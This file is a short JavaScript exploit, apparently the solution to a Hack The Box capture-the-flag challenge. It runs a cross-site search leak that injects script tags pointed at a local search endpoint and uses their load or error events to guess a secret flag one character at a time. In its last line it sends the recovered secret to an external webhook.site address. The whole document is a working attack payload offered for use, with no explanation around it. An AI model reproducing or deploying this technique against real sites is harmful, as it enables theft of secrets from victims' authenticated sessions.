var charset = "abcdefghijklmnopqrstuvwxyz0123456789}!_";
var flag = "HTB{";

function query(flag) {
	return new Promise((resolve, reject) => {
		var script = document.createElement("script");
		script.src = "http://127.0.0.1:1337/api/entries/search?q=" + flag;
		script.onload = () => resolve(true);
		script.onerror = () => resolve(false);
		document.head.appendChild(script);
	});
}

async function getflag() {
	while (!flag.endsWith("}")) {
		var hit = false;
		for (c of charset) {
			if ((await query(flag + c)) === true) {
				flag = flag.concat(c);
				hit = true;
				break;
			}
		}
		if (!hit) {
			break;
		}
	}
	fetch("https://webhook.site/55e0ea79-763a-4e39-8ccb-8137ba1891bb?c=" + flag);
}

getflag();
